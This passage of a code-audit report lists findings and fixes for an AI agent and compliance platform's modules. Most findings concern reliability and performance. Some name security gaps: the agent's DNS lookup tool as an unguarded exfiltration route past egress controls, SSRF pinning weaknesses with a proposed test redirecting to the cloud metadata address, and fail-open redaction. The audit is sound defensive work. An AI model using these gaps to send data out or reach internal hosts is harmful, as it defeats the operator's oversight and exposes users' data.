| W4-69 | medium | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/compliance_scoping.py:164` | Fourteen governance modules carry hand-copied private helper functions whose bodies have silently diverged | Extract one `maverick/_governed_helpers.py` (canonical JSON + bound, sha256 digest, validated timestamp/integer/id/tenant/revision, principal resolver, SQLite connect/pragmas, audit-event append) and have each module import it; keep module-specific error classes by passing the exception type. Do it module-by-module with the existing test files as the safety net. | M |

### core/grc-suite SQLite stores (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-70 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/compliance_scope_actions.py:592` | Four hand-rolled SQLite stores pin SCHEMA_VERSION=1 with no migration path and sit outside the migration-governance ratchet | Introduce a small shared `sqlite_store.py` with an ordered MIGRATIONS list per store, apply-under-BEGIN IMMEDIATE, and user_version bump; register those ladders with migration_governance so checksums are locked; check the version before creating tables. Consolidate on one versioning mechanism (user_version). | M |

### core/health(doctor) (5)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-49 | medium | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/health.py:166` | `doctor` provider probes still have no client timeout — unresolved prior finding | Pass `timeout=5.0` (or a MAVERICK_DOCTOR_TIMEOUT knob) to both clients; report a timeout as the existing RED 'API unreachable' row. | S |
| W3-50 | medium | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/health.py:613` | `doctor` config-perms check is POSIX-only: on Windows it always warns 'group/world-accessible' and prescribes `chmod 600` | Skip the mode-bit check when `os.name == 'nt'` and instead verify via the existing file_lock Windows DACL helpers (or icacls), with a Windows-appropriate fix hint; add a test that monkeypatches os.name. | S |
| W3-59 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/health.py:152` | Remediation hints in `doctor` and the run-error humaniser hard-code `~/.maverick/...` even when MAVERICK_HOME / MAVERICK_CONFIG relocate the install | Derive the paths from config.paths() / config_path() (already imported in _check_config) and interpolate them into the fix strings; a helper `_env_path()`/`_config_hint()` keeps it one-line. | S |
| W3-60 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/cli/__init__.py:500` | `doctor` has no machine-readable output although it is positioned as the CI/deploy health gate; `preflight` and `launch-check` differ too | Have _row() append to a list of dicts and add `--json` to doctor and launch-check (emit rows + failures + exit semantics); keep text default. | S |
| W3-61 | improvement | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/health.py:146` | `doctor` tells the user 'fine unless a [models] role routes to an anthropic model' instead of checking it — preflight already has the route check | Call _routed_configuration_missing in _check_anthropic/_check_openai and render one row per incomplete route (RED) with the exact env var missing; reword the base-URL-only case. | S |

### core/migration_governance (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-55 | medium | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/migration_governance.py:236` | Migration immutability ratchet is procedural only: --regen re-pins edited released versions, and fingerprinting the base SCHEMA as v1 forces a regen for every additive base-table change | Make write_lock() refuse (or require `--force-repin=<backend>:<version>` with a reviewable audit line) when a version already in the lock would change checksum; fingerprint SCHEMA per CREATE statement (split on ';') so an additive new table changes only a new entry; add a test that edits MIGRATIONS[2] and asserts --regen fails. | S |

### core/oidc (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-51 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/oidc.py:406` | OIDC JWKS endpoint is fetched over whatever scheme is configured; http:// jwks_uri is accepted | Reject non-https jwks_uri in load_oidc_config()/_resolve_signing_key (mirror the issuer check), with an explicit dev-only override env if needed. | S |

### core/oidc + dashboard/auth (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-12 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/oidc.py:406` | OIDC bearer verification builds a new PyJWKClient per request and performs a blocking JWKS fetch inside the async auth dependency | Cache one PyJWKClient per jwks_uri at module level (like _DISCOVERY_CACHE) so keys are refreshed on the 300s lifespan / unknown-kid path only; run the OIDC verification (and the file-store loads) via run_in_threadpool inside require_principal_in_request_context and copy the tenant pin back to the request task (set_tenant after the threadpool returns) instead of executing the whole chain on the loop. | M |

### core/operator_preflight + soc2 (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-56 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/operator_preflight.py:917` | operator_preflight/soc2 read MAVERICK_AUDIT_SIGNING_KEY from os.environ after the signer has already popped it, so in-process custody reports go stale | Derive custody from signing.active_key_is_offhost()/_injected_keypair() (the cached selection) instead of re-reading the env var; keep env reads only for the pre-init CLI path. | S |

### core/preflight + context_scaling (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-5 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/preflight.py:30` | Preflight/context-scaling table caps Opus 4.8, 4.7 and Sonnet 4.6 at 200k although they are 1M-context models | Update _MODEL_CONTEXT_LIMITS to the published windows (1_000_000 for opus-4-6/4-7/4-8, sonnet-4-6, opus-5, sonnet-5; keep haiku-4-5 at 200k) and add the missing current ids; long term, populate the table from the Models API (`client.models.retrieve(id).max_input_tokens`) at doctor time and cache it, so new releases do not need a code change. | S |

### core/privacy_data_discovery (detectors) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-45 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/privacy_data_discovery.py:594` | Personal-data detector flags Unix timestamps as phone numbers/payment cards and C++ '::' as IP addresses | For phone: require a separator/parenthesis/leading + OR a field-name hint, and mark bare 10-digit runs ambiguous with lower confidence. For cards: require separators or a known IIN prefix (4, 51-55, 2221-2720, 34/37, 6011...) for bare digit runs. For IP: require at least two ':' groups containing a digit or a dotted-quad, and reject candidates adjacent to identifier characters. Add tests with epoch seconds/ms and C++ scope operators asserting no non-ambiguous detection. | S |

### core/privacy_egress (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-46 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/privacy_egress.py:40` | Outbound PII redaction silently turns OFF when config.toml is unreadable/corrupt (fail-open privacy control) | In redact_egress_enabled(): call config_source_errors() and, if non-empty, either return True (redact) or raise so llm.py refuses the outbound call, logging which source failed. Mirror the pattern already used by the other enabled() functions. Add a test that corrupts config.toml and asserts the prompt is still redacted. | S |
| W4-58 | improvement | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/privacy_egress.py:110` | Egress redaction re-runs provable redaction over the entire conversation on every LLM call | Memoise redacted content by (id(msg) or sha256 of the canonical block) in a bounded LRU on the module, or have the agent loop keep a parallel already-redacted history and only redact the newly appended blocks. | S |

### core/privacy_ops (DPA review) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-44 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/privacy_ops.py:990` | DPA reviewer credits Art. 28(3) clauses from generic words ('notif', 'audit', 'encrypt') | Require co-occurrence with the clause's subject within a window (e.g. breach: r'(personal.?data\|security).{0,40}breach' AND r'notif\|inform' within 200 chars; audit: r'audit.{0,60}(controller\|customer)\|right.{0,30}audit'; security: 'technical and organi[sz]ational' or 'article 32', not bare 'encrypt'), and downgrade single-keyword hits to 'unclear' instead of 'present'. Add regression tests with unrelated 'notify'/'audit'/'encrypt' sentences asserting status != 'present'. | S |

### core/privacy_ops (DSAR fulfilment) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-49 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/privacy_ops.py:2895` | DSAR access/portability export bundles are written as plaintext JSON with no retention or purge path | Add a retention field to the DSAR record (default e.g. 30 days after fulfilment), a purge in the existing privacy maintenance/scheduler path that unlinks the artifact and clears fulfillment.export_path, and encrypt the artifact with the governed-document vault or the at-rest key used elsewhere in the suite. Surface artifact presence/age in the DSAR row so operators can see un-purged exports. | M |

### core/privacy_ops (DSAR) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-50 | medium | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/privacy_ops.py:2504` | DSAR SLA clock is a flat 30 days for every kind and jurisdiction with no extension support | Add `regime` (gdpr/ccpa/…) and `extended_until`/`extension_reason` to the DSAR record; compute due_at with calendar-month arithmetic for GDPR and 45 days for CCPA; expose an audited `extend_dsar()` mutation and show extensions in the aging view. | S |

### core/privacy_ops (record store) + dashboard overview (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-48 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/privacy_ops.py:2742` | Dashboard privacy overview loads every privacy_ops record with a per-file flock and performs writes on GET | Use count_records()/list_bounded() on the overview and page endpoints; move retry_pending_audits() and the erasure-handoff migration to the existing scheduler/maintenance path instead of GET; keep a per-vendor version counter (or a small index file) so save_paper_review is O(1). Longer term, move these six JSON-per-record stores onto the same SQLite store pattern the rest of the suite uses. | M |

### core/privacy_regulatory_intelligence (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-47 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/privacy_regulatory_intelligence.py:1564` | Regulatory-intelligence search re-hashes every document body and source payload on every query (O(corpus) SHA-256 per search) | Verify content digests once at ingest and on verify_integrity(), not per search; add an FTS5 virtual table (or a token table) keyed by (tenant_id, document_id, version) populated at add_document time and query it with word-boundary matching; page the SELECT instead of fetchall. Keep the integrity re-check behind an explicit `verify=True` flag. | M |

### core/privacy_rights_consumer_delivery (public redeem) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-54 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/privacy_rights_consumer_delivery.py:1604` | One-time consumer delivery burns the subject's limited redeem attempts on backend/resolver outages | Distinguish infrastructure failures from consumer errors: on resolver/authority exceptions raise a retryable 503-class error without touching attempts (or record a separate 'infra_failure' counter that does not count toward max_attempts), and only count attempts when the presented material was actually compared. Add tests where the binding resolver raises and assert attempts is unchanged. | S |

### core/reachability (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-5 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/reachability.py:267` | reachability.lock.json is stale (295 modules missing, incl. 20/22 consent core modules and 33 dashboard consent modules) and --ci still passes; the docstring's doc-drift check does not exist | Make --ci fail when classify() contains modules absent from the lock (not only UNREACHED ones) and regenerate the lock; implement the promised FEATURES.md cross-check (fail when a backticked module name in FEATURES.md is TEST_ONLY/UNREACHED) or delete that sentence. | S |

### core/reachability (governance-suite classification) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-33 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/reachability.py:267` | reachability.lock.json is stale for 295 of 1,368 modules (34 of 44 ai_* modules absent) and the CI 'ratchet' cannot notice, contradicting the module's stated guarantee | Make --ci fail when any live module is missing from the lock (or when counts differ), propagate reachability from CLI_ONLY roots (classify CLI-reached modules as CLI_ONLY), implement or delete the FEATURES.md cross-check the docstring promises, and regenerate the lock (`python -m maverick.reachability --regen`) in the same PR. | S |

### core/red_team_campaigns + soc2_certification_evidence (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-73 | medium | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/red_team_campaigns.py:1` | red_team_campaigns.py and soc2_certification_evidence.py (~2.9k lines) are reachable only from tests and absent from the reachability ledger | Either wire them (an API/CLI surface plus a wizard knob, per kernel rules 5-6) or move them under an explicit experimental package and mark them so in the module header; extend reachability.drift() to flag new TEST_ONLY modules too and regenerate the lock (see the ledger finding). | M |

### core/runner (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-72 | medium | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-core/maverick/runner.py:431` | Goal execution is funnelled through the asyncio default executor (cpu+4 threads), silently capping concurrency below MAX_CONCURRENT_GOALS and starving other to_thread users | Create a dedicated bounded ThreadPoolExecutor for goal runs sized to MAX_CONCURRENT_GOALS + a small waiter allowance and use loop.run_in_executor(goal_executor, ...) (contextvars copied via contextvars.copy_context().run), or call loop.set_default_executor at dashboard/server startup with an explicit size derived from the concurrency knobs. Surface executor saturation in /metrics. | S |
| W1-84 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/runner.py:53` | Per-principal semaphore registry grows without bound for every distinct user id/agent seen by the process | Evict entries whose semaphore is idle (value == cap) under the lock after use, or cap the dict with an LRU that only drops idle lanes. | S |

### core/secrets (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-54 | medium | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/crypto_at_rest.py:581` | The most sensitive key material (at-rest key, KMS KEK, audit signing key, dashboard token, screenshot key) bypasses secret_provider and can only be supplied via process environment | Route every master-key/secret read through secret_provider.get_secret (file backend first, env fallback) and pop the env copy after first read as signing does; document the supported file names. | S |

### core/server (channels) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-75 | medium | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-core/maverick/server.py:295` | Channel server performs synchronous SQLite world writes on the shared asyncio loop of all channel adapters | Move the pre-dispatch world writes into one asyncio.to_thread(...) block (they already run inside the tenant scope which to_thread preserves), mirroring the existing companion-generation pattern. | S |

### core/tenant/concurrency (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-74 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tenant/concurrency.py:23` | Per-tenant concurrency ceiling is a process-local dict enforced only at the channel door | Move the in-flight count to the world model (a per-tenant row with compare-and-swap, or a JobQueue claim predicate) and enforce it in orchestrator/runner admission where tenant_over_quota is checked (orchestrator.py:1298-1312), so every entry point and every process shares one ceiling. Document the current scope honestly in docs/multi-tenancy.md. | M |
| W1-82 | low | Raised (finder cited evidence; skeptic pass not run); prior | correctness | `packages/maverick-core/maverick/tenant/concurrency.py:58` | tenant.concurrency.release() is documented 'Idempotent-safe' but an unmatched release frees another caller's live slot (unfixed prior finding) | Return an opaque token from acquire() and require it in release() (no-op on unknown/duplicate token), or drop the 'Idempotent-safe' claim and add an assertion/log on underflow. | S |

### core/tenant/registry + channels (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-71 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/tenant/registry.py:654` | Per-user tenancy is refused for every channel user as soon as one named tenant is provisioned; docs and code comments claim the opposite | Either (a) make is_active/assert_tenant_active admit ids that tenant_by_user_enabled() would generate (or add `[tenancy] by_user_requires_roster`), or (b) fix docs/multi-tenancy.md:77-79 and the server.py:182 comment, add a config-lint/doctor warning when by_user is on and a roster exists, and reject `maverick tenant create` / POST /admin/tenants with a clear error in by_user mode. | S |

### core/tenant/registry + dashboard/rbac (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-72 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tenant/registry.py:621` | Deleting a tenant leaves its RBAC memberships and workspace selections behind; a re-created tenant with the same id inherits the old members | Give registry.delete_tenant a cleanup hook (or have the dashboard DELETE route and SCIM path) remove the tenant's entries from rbac tenant roles, workspace selections, partner_store rows and the tenant's reservations file, and audit it. Alternatively make TenantRecord carry a creation nonce and key memberships by (id, nonce). | S |

### core/tests-env-isolation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-83 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_provider_base_url_plumbing.py:33` | Provider-env test fixtures clear an incomplete list of variables — 5 suite failures whenever the host exports ANTHROPIC_BASE_URL | Add one shared fixture in the root conftest (`clean_provider_env`) that derives its list from `config.PROVIDER_BASE_URL_ENV_MAP` plus the key-var table in config.py, and use it in these four files; for subprocess tests pass a scrubbed env built by the same helper. | S |

### core/third_party_executive_reports (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-89 | medium | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/third_party_executive_reports.py:854` | Executive PDF renderer overflows the page: body lines land below the footer / at the page edge once a report has ≥6 sources | Paginate by remaining vertical budget (`y - y_step < 60` → new page) instead of a fixed line count, and add a test asserting every `Td` y-coordinate is ≥ 50. | S |

### core/third_party_intelligence (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-88 | medium | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-core/maverick/third_party_intelligence.py:2828` | `evaluate_risk` gathers all evidence outside the write transaction, so an autoapproval can commit against concurrently changed vendor/relationship/source state | Perform the reads inside the write transaction (same connection) or re-read vendor/relationships/sources by primary key inside the transaction and abort with `ThirdPartyIntelligenceConflict` if any `revision`/`integrity_sha256` differs from the values used for scoring. | M |
| W4-86 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/third_party_intelligence.py:4007` | Intelligence outbox re-lease of expired leases never counts an attempt and uses a predictable lease token | On expired-lease reclaim increment `attempt`, dead-letter when `attempt >= maximum_attempts` (mirror lifecycle.claim_callbacks 2640-2649), and derive the lease token from `secrets.token_urlsafe(32)` like the runtime/trc stores. | S |
| W4-99 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/third_party_intelligence.py:4846` | Intelligence retention purge decodes every snapshot and contribution in Python instead of filtering in SQL | Add a `retained_until REAL` column (+index) to both tables, populate it on insert, and purge with `DELETE ... WHERE tenant_id=? AND retained_until<=?` bounded by a limit. | S |

### core/third_party_intelligence_delivery (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-85 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/third_party_intelligence_delivery.py:173` | Alert delivery worker aborts the whole batch when a slow send outlives its lease (fail_outbox raises inside the except handler) | Wrap the `fail_outbox` call in its own try/except that records the outcome as `lease_lost` and continues; size the lease from the transport timeout (lease ≥ 2×SMTP_TIMEOUT + store overhead) or renew the lease before sending. | S |
| W4-94 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/third_party_intelligence_delivery.py:95` | Delivery error classifier maps ConnectionRefusedError to `provider_rejected` and SMTPConnectError to `delivery_error` | Match on exception types (`smtplib.SMTPRecipientsRefused`/`SMTPSenderRefused` → provider_rejected; `OSError`/`socket.timeout`/`SMTPConnectError`/`SMTPServerDisconnected` → transport_unavailable) before falling back to the name heuristic. | S |

### core/third_party_intelligence_providers (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-92 | medium | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/third_party_intelligence_providers.py:44` | Named provider feeds pin real vendor hosts (RiskRecon/SecurityScorecard/HackNotice) to invented paths and a Lightwork-private schema — the advertised integrations cannot succeed | Either implement the vendors' actual response schemas behind the adapter (SecurityScorecard /companies/{domain}/factors etc.), or make the host deployment-enrolled for all providers (as already done for SupplyWisdom/ISS) so a customer can front the vendor API with their own normalizing gateway; reword the wizard prompt accordingly. | L |

### core/third_party_intelligence_runtime (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-87 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/third_party_intelligence_runtime.py:917` | Feed-runtime `claim_jobs` re-leases expired jobs indefinitely without honouring `maximum_attempts` | In `claim_jobs`, when reclaiming a `leased`-and-expired row with `attempt >= maximum_attempts`, transition to `dead_letter` with `last_error_code='lease_expired_attempts_exhausted'` (as third_party_lifecycle.claim_callbacks does at 2640-2649) and audit it. | S |

### core/tools/_ssrf (4)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-99 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/_ssrf.py:141` | Single-address pinning (ips[0]) removes address fallback: IPv6-first answers on dual-stack hosts with broken v6, or a dead first A record, make every pinned fetch fail | Pin the validated address SET rather than one address: have _PinnedTransport iterate the validated IPs (v4 preferred, or honour MAVERICK_FETCH_PREFER_IPV4) and fall back on ConnectError/OSError, or resolve with family filtering and prefer AF_INET when no default IPv6 route exists; same for _make_pinned_connect. | M |
| W2-95 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/_ssrf.py:212` | _ssrf.safe_client/safe_async_client silently ignore HTTP(S)_PROXY/NO_PROXY, so every pinned tool goes direct while plain httpx connectors honour the proxy | Either document 'SSRF-pinned tools never use a proxy' loudly in the tool descriptions and doctor output, or support an explicit trusted proxy (e.g. MAVERICK_FETCH_PROXY / [network] proxy) by building HTTPTransport(proxy=...) and, when a proxy is in use, validating the target host via resolve_pinned_ip but connecting to the proxy (pin cannot apply through a CONNECT tunnel). Make the httpx and urllib pinned paths behave identically. | M |
| W2-101 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/_ssrf.py:182` | Pinned transport sends the IDN hostname as raw Unicode in the Host header (httpx would send punycode) | Encode host with .encode('idna').decode('ascii') when building host_header and sni_hostname in safe_client/safe_async_client (and in websocket_tool's server_hostname). | S |
| W2-100 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/_ssrf.py:232` | safe_client/safe_get silently discard httpx client kwargs that only apply to the default transport (verify, cert, proxy) because an explicit transport is always injected | Forward verify/cert/http2/proxy into httpx.HTTPTransport(...) / AsyncHTTPTransport(...) inside safe_client/safe_async_client, or drop those parameters and raise TypeError when supplied. | S |

### core/tools/dns_lookup (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-91 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/dns_lookup.py:82` | dns_lookup tool is an ungated DNS exfiltration channel that bypasses every egress control | In _run(), refuse when enterprise_enabled() unless the queried name matches [enterprise] allowed_hosts (or add a dedicated [enterprise] allow_dns knob), and apply tenant.egress.egress_allowed('dns_lookup', host); log an EGRESS_BLOCKED audit event on refusal. Mention DNS in enterprise.py's 'what it still does not cover' list until then. | S |

### core/tools/http_fetch (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-98 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/http_fetch.py:430` | http_fetch tool never follows redirects (pinned client hard-codes follow_redirects=False and no re-validated hop loop exists), so any 301/302 page returns the redirect stub | In _stream_fetch, loop up to N (e.g. 5) hops: on 3xx with Location, urljoin, re-run _preflight_fetch checks (enterprise, tenant, private-IP) on the new URL, open a fresh safe_client for it (new pin) and continue; strip Authorization/Cookie headers on cross-host hops; report the final URL. Cover with a test using a MockTransport chain including a redirect to 169.254.169.254 that must be refused. | S |
| W2-105 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/http_fetch.py:320` | guarded_urlopen resolves DNS for the target before the enterprise egress check runs, leaking denied hostnames to the resolver (and http_fetch resolves each host up to three times per call) | Call enterprise.enterprise_egress_denial(url, tool=...) (and tenant egress) at the top of guarded_urlopen before _check_url_allowed; in _run_fetch, drop the pre-flight _is_private_ip and rely on resolve_pinned_ip's fail-closed check (surfacing BlockedHost as the same ERROR string). | S |

### core/trc_continuous_evidence (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-81 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/trc_continuous_evidence.py:3114` | Continuous-evidence error classifier collapses every stock-provider failure into `collector_contract_error` | Check the specific subclasses first: map StockEvidenceAccessDenied→collector_access_denied (and treat as non-retryable/cancel), StockEvidenceUnavailable/EvidenceCollectorUnavailable→collector_unavailable, StockEvidenceProtocolError→collector_contract_error, and carry `str(error)` (already a closed reason code) into the job error_code. | S |

### core/trc_stock_evidence_collectors (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-82 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/trc_stock_evidence_collectors.py:1224` | AWS Security Hub stock collector speaks the wrong wire protocol (JSON-1.1 X-Amz-Target on POST / instead of REST POST /findings) | Use `method, path = "POST", "/findings"` with `Content-Type: application/json` (body `{"MaxResults":..,"NextToken":..}`), drop X-Amz-Target for Security Hub, keep SigV4 signing (sign `content-type`, `host`, `x-amz-date`); add a contract test pinned to the botocore service model (protocol=rest-json, requestUri=/findings). | S |

### core/ux_store + dashboard (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-76 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/ux_store.py:211` | ux_store.shared() (dashboard pins/gallery) pins its file to whichever tenant made the first request in the process | Re-key ux_store._shared (and learning/router_v3 for consistency) as `dict[Path, Store]` resolved from data_dir() at each shared() call, matching procedural_memory.shared(). | S |

### core/vendor_management (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-83 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/vendor_management.py:269` | Hosted-form questionnaire bearer tokens are stored in plaintext and returned by the vendor list/detail API | Store `token_sha256` in the record and return the raw token only once from `request_questionnaire`; resolve `/form/{token}` by hashing the presented token; redact the field in list/get responses (or at least strip it in the API layer). | S |
| W4-98 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/vendor_management.py:652` | OneTrust vendor import swallows every per-row failure and never reports what was skipped | Return a structured result `{imported:[...], skipped:[{row, reason}]}` distinguishing duplicate/invalid/capacity, and surface it in the API and CLI. | S |

### core/vendor_management + dashboard/app (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-84 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/vendor_management.py:535` | Public unauthenticated `/form/{token}` lookup scans and lock-reads the entire vendor register per request with no rate limit | Maintain a token→vendor_id index (e.g. a small governed record keyed by token_sha256, or form_store metadata) so the public route does one O(1) lookup; apply `check_goal_rate_limit(request, source="form")` before any store access on both GET and POST. | M |

### core/worker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-70 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/worker.py:344` | Worker.run_once re-executes a job whose handler already succeeded when complete() raises (duplicate side effects on the normal path, not only reclaim) | Split the terminal write out of the handler try: on complete() failure retry the UPDATE with backoff (it is idempotent and fenced on attempts), and only if it still fails leave the row 'running' (lease reclaim will handle a genuine crash) rather than calling fail(). Persist a durable 'handler_done' marker in the payload before complete() so a reclaimed/retried job can short-circuit. Add the scratch test as a regression test. | S |

### core/world_model_backends/pg_rls + cli (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-73 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/world_model_backends/pg_rls.py:124` | `maverick tenant backfill` writes the raw tenant id while the runtime scopes rows by the percent-encoded segment, so backfilled rows stay invisible for any non-slug id | In pg_rls.backfill (or the CLI) canonicalize with `_tenant_segment(bind_tenant_namespace(canonical_tenant_id(tenant_id)))` before writing, and print both the raw and stored forms; have backfill refuse (or set the GUC) when RLS is already forced. | S |

### dashboard/api input validation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
